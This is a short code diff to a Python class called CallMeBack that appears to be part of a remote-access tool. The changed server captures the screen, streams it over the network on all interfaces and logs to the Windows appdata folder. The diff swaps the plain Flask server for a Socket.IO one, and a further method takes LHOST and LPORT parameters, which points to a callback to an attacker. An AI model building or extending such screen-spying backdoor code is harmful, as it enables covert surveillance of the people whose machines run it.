@@ -25,8 +25,11 @@ class CallMeBack:
         import cv2
         import numpy as np
         from flask import Flask, Response
+        from flask_socketio import SocketIO, emit
+
         import pyautogui
         app = Flask(__name__)
+        socketio = SocketIO(app)
         log = logging.basicConfig(filename=os.environ["appdata"]+'\\'+'server.log', level=logging.INFO, format='%(asctime)s - %(message)s')
         def generate_frames():
            while True:
@@ -47,7 +50,7 @@ class CallMeBack:
             return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
         if __name__=='__main__':
             sys.stdout = sys.stdout.flush()
-            app.run(host='0.0.0.0',port=int(f'{Port}'),debug=False)
+            socketio.run(app,host='0.0.0.0',port=int(f'{Port}'),debug=False)
             
     def __Socket_SockClinet(self,LHOST=LHOST,LPORT=LPORT):
         
